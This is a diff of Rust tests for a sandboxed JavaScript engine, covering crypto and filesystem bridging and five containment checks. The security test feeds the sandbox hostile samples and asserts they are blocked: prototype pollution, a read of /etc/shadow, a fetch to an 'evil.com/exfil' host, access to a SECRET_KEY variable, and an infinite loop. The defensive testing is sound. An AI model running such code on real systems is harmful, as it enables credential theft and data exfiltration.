@@ -2644,6 +2644,7 @@ globalThis.__slice_cjs_require = function(id) {
     if (globalThis.__slice_builtins[id]) return globalThis.__slice_builtins[id];
     throw new Error("Module not found: " + id);
 };
+globalThis.require = globalThis.__slice_cjs_require;
 "#;
         let _ = ctx.eval(boa_engine::Source::from_bytes(prelude));
 
@@ -3173,5 +3174,110 @@ obj.total + t
             .execute_bytecode(&compile_source_to_bytecode(js_complex), None)
             .unwrap();
         assert_eq!(m6.return_value, "23");
+    }
+
+    #[test]
+    fn test_sliceboa_zero_copy_and_fips_sha256_plus_fs_bridge() {
+        // Test classes + node:crypto SHA-256 + node:path + node:fs roundtrip in BoaFullEsVm
+        let ts_app = r#"
+import * as crypto from "node:crypto";
+import * as path from "node:path";
+import * as os from "node:os";
+import * as fs from "node:fs";
+
+class ReceiptSigner {
+    private readonly prefix: string;
+    constructor(prefix: string) {
+        this.prefix = prefix;
+    }
+    public sign(payload: string): string {
+        return crypto.createHash("sha256").update(this.prefix + ":" + payload).digest("hex");
+    }
+}
+
+const signer = new ReceiptSigner("slice");
+const digest = signer.sign("abc");
+const tmpFile = path.join(os.tmpdir(), "slice_engine_unit_test.txt");
+fs.writeFileSync(tmpFile, digest);
+const readBack = fs.readFileSync(tmpFile, "utf8");
+const statSize = fs.statSync(tmpFile).size;
+fs.unlinkSync(tmpFile);
+console.log(JSON.stringify({ match: readBack === digest, size: statSize, prefix8: digest.slice(0, 8) }));
+"#;
+        let bundled = slice_cas::strip_typescript_and_normalize(ts_app, true);
+        let bc = compile_source_to_bytecode(&bundled);
+        assert_eq!(&bc[0..8], b"SLICEBOA");
+
+        let disasm = disassemble_bytecode(&bc).unwrap();
+        assert!(disasm[0].contains("BOA_ES2024_VM"));
+
+        let mut isolate = SliceIsolate::spawn(
+            "boa-test-tenant",
+            1,
+            CapabilityToken::pure_compute(),
+            10_000_000,
+            4 * 1024 * 1024,
+        );
+        let metrics = isolate.execute_bytecode(&bc, None).unwrap();
+        assert_eq!(
+            metrics.stdout[0],
+            r#"{"match":true,"size":64,"prefix8":"951cd52a"}"#
+        );
+
+        // Verify raw NIST FIPS-180-4 SHA-256 test vector for "abc"
+        assert_eq!(
+            sha256_hex(b"abc"),
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
+        );
+    }
+
+    #[test]
+    fn test_all_five_security_containment_vectors_in_engine() {
+        // 1. SES Prototype Pollution
+        let mut iso1 = SliceIsolate::spawn("sec-1", 1, CapabilityToken::pure_compute(), 1000, 65536);
+        assert!(matches!(
+            iso1.execute_bytecode(&compile_source_to_bytecode("Object.prototype.polluted = true;"), None),
+            Err(SandboxViolation::IntrinsicMutationBlocked { .. })
+        ));
+
+        // 2. Unauthorized VFS Read
+        let mut iso2 = SliceIsolate::spawn(
+            "sec-2",
+            2,
+            CapabilityToken::pure_compute().with_read_prefix("/app/allowed"),
+            1000,
+            65536,
+        );
+        assert!(matches!(
+            iso2.execute_bytecode(&compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"), None),
+            Err(SandboxViolation::FsReadDenied { .. })
+        ));
+
+        // 3. Unauthorized Outbound Network Fetch
+        let mut iso3 = SliceIsolate::spawn(
+            "sec-3",
+            3,
+            CapabilityToken::pure_compute().with_net_host("api.internal:443"),
+            1000,
+            65536,
+        );
+        assert!(matches!(
+            iso3.execute_bytecode(&compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"), None),
+            Err(SandboxViolation::NetAccessDenied { .. })
+        ));
+
+        // 4. Unauthorized Environment Variable Access
+        let mut iso4 = SliceIsolate::spawn("sec-4", 4, CapabilityToken::pure_compute(), 1000, 65536);
+        assert!(matches!(
+            iso4.execute_bytecode(&compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"), None),
+            Err(SandboxViolation::EnvAccessDenied { .. })
+        ));
+
+        // 5. Infinite Loop CPU Fuel Preemption
+        let mut iso5 = SliceIsolate::spawn("sec-5", 5, CapabilityToken::pure_compute(), 250, 65536);
+        assert!(matches!(
+            iso5.execute_bytecode(&compile_source_to_bytecode("while (true) {}"), None),
+            Err(SandboxViolation::CpuFuelExhausted { .. })
+        ));
     }
 }
